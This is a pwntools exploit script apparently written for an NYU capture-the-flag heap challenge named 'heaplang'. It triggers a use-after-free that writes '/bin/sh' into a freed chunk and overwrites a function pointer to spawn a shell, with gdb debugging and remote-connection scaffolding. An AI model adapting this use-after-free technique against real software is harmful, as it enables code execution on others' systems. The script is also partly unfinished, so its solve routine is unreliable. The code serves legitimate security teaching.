#import from py
import re

#outside imports
from pwn import *

#used for pulling the flag from output
flag_regex = r"flag\{[^}]+\}"
global_timeout = 5 #seconds

#challenge-specific info
host = 'offsec-chalbroker.osiris.cyber.nyu.edu'
port = 1345
netid='pk1898'

do_remote = False
binary_name = './heaplang'

#for doing local debugging
is_local_dbg = True
gdb_script = '''
set pagination off
set disassembly-flavor intel
set follow-fork-mode parent
i proc mappings

b *0x00401207
commands
heap
x/10wx 0x006020c0
x/80wx *(0x006020c0+0x8)

end

c
'''
# x/40wx *(0x006020c0+0x28)
#context.log_level ='debug'

#universal flag finder, given a string
def find_flag(input):
    print input
    m = re.findall(flag_regex, input)
    if(m != []):
        return m[0]
    else:
        return None

e = ELF('heaplang')

cmd_create  = '1'
cmd_edit    = '2'
cmd_display = '3'
cmd_delete  = '4'
cmd_exit    = '5'

type_number = '0'
type_string = '1'
type_array  = '2'


def stage_00_create_and_free(target):
    #create a 10-byte string
    target.sendlineafter('> ',          cmd_create)
    target.sendlineafter('Type?',       type_string)
    target.sendlineafter('Length?',     str(10))
    target.sendlineafter('Contents?',   'A'*8)

    # #create a 10-byte string
    # target.sendlineafter('> ',          cmd_create)
    # target.sendlineafter('Type?',       type_string)
    # target.sendlineafter('Length?',     str(10))
    # target.sendlineafter('Contents?',   'B'*8)


    #free the string
    target.sendlineafter('> ',          cmd_delete)
    target.sendlineafter('Index?',      str(0))

    target.sendlineafter('> ',          cmd_edit)
    target.sendlineafter('Index?',      str(0))
    target.sendlineafter('Length?',     str(10))
    target.sendlineafter('Contents?',   '/bin/sh')


    # #free the string
    # target.sendlineafter('> ',          cmd_delete)
    # target.sendlineafter('Index?',      str(1))

    target.sendlineafter('> ', cmd_create)
    target.sendlineafter('Type?', type_number)
    target.sendlineafter('Value?',  str(0x004006e0))

    return

def stage_02_trigger_uaf(target):
    #create a 10-byte string
    target.sendlineafter('> ',          cmd_display)
    target.sendlineafter('Index?',      str(0))
    return

def stage_0_create_and_free(target):
    #create a 10-byte string
    target.sendlineafter('> ',          cmd_create)
    target.sendlineafter('Type?',       type_string)
    target.sendlineafter('Length?',     str(40))
    target.sendlineafter('Contents?',   'A'*30)

    #create a 10-byte string
    print target.sendlineafter('> ',          cmd_display)
    print target.sendlineafter('Index?',      str(0))
    print target.readline()
    print target.readline()

    #free the string
    target.sendlineafter('> ',          cmd_delete)
    target.sendlineafter('Index?',      str(0))

    # create something else

    target.sendlineafter('> ', cmd_create)
    target.sendlineafter('Type?', type_number)
    target.sendlineafter('Value?',  str(0x004006e0))


    target.sendlineafter('> ',          cmd_edit)
    target.sendlineafter('Index?',      str(0))
    target.sendlineafter('Length?',     str(20))
    target.sendlineafter('Contents?',   '/bin/sh')

    # #free the string
    # target.sendlineafter('> ',          cmd_delete)
    # target.sendlineafter('Index?',      str(2))
    #
    # target.sendlineafter('> ', cmd_create)
    # target.sendlineafter('Type?', type_number)
    # target.sendlineafter('Value?',  str('/bin/sh'))
    #


    # target.sendlineafter('> ',          cmd_create)
    # target.sendlineafter('Type?',       type_string)
    # target.sendlineafter('Length?',     str(4))
    # target.sendlineafter('Contents?',   'C'*4)
    return


def stage_1_do_some_stuff(target):
    #create something
    target.sendlineafter('> ',          cmd_create)
    target.sendlineafter('Type?',       type_string)
    target.sendlineafter('Length?',     str(4))
    target.sendlineafter('Contents?',      'B'*4)

    # create something else
    target.sendlineafter('> ',          cmd_create)
    print target.sendlineafter('Type?',       type_number)
    print target.sendlineafter('Value?',      str(0x41414141))
    return


def stage_2_trigger_uaf(target):
    #create a 10-byte string
    target.sendlineafter('> ',          cmd_display)
    target.sendlineafter('Index?',      str(0))
    return


def solve(target):
    stage_00_create_and_free(target)
    # target.interactive()
    #
    #stage_1_do_some_stuff(target)
    stage_02_trigger_uaf(target)

    target.interactive()
    # print target.readline()
    # target.sendline('cat flag.txt')
    # return target.readline()


#universal target setup for remote-only
def target():
    if(do_remote):
        r = remote(host, port)
        r.sendline(netid)
        r.recvline() # eat interstitial
        return r
    else:
        if(is_local_dbg):
            target = gdb.debug(binary_name, gdb_script)
        else:
            target = process(binary_name)
        return target

#scaffolding
def main():
    with target() as p:
        flag = find_flag(solve(p))
    if(flag):
        print "Challenge Solved: %s" % flag
    else:
        print "Challenge Not Solved"

if __name__ == '__main__':
    main()
